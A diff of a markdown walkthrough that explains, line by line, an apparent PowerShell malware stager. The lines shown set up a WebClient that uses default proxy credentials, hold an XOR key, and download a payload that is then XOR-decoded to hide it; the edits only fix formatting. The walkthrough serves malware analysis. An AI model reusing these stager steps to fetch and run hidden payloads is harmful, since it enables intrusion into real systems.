@@ -76,25 +76,23 @@ $web_client.Headers.Add('User-Agent',$user_agent);
 Sets the proxy settings to use the system's default web proxy.
 
 ```powershell
-$web_client.Proxy = [System.Net.WebRequest]::DefaultWebProxy;: 
+$web_client.Proxy = [System.Net.WebRequest]::DefaultWebProxy;
 ```
 
 sets the proxy credentials to use the default network credentials.
 
-```Powershell
+```powershell
 $web_client.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; 
 ```
 
 Variable holds a password.
-
 ```powershell
 $Password='<Key>';
 ```
 
 Initializes a counter variable.
-
-```Powershell
-$i=0;: 
+```powershell
+$i=0;
 ```
 
 This line downloads the content from the specified URI using the WebClient instance created earlier. It then XORs (bitwise exclusive OR) each character of the downloaded content with the characters of the password. This is a common obfuscation technique used to hide the payload.
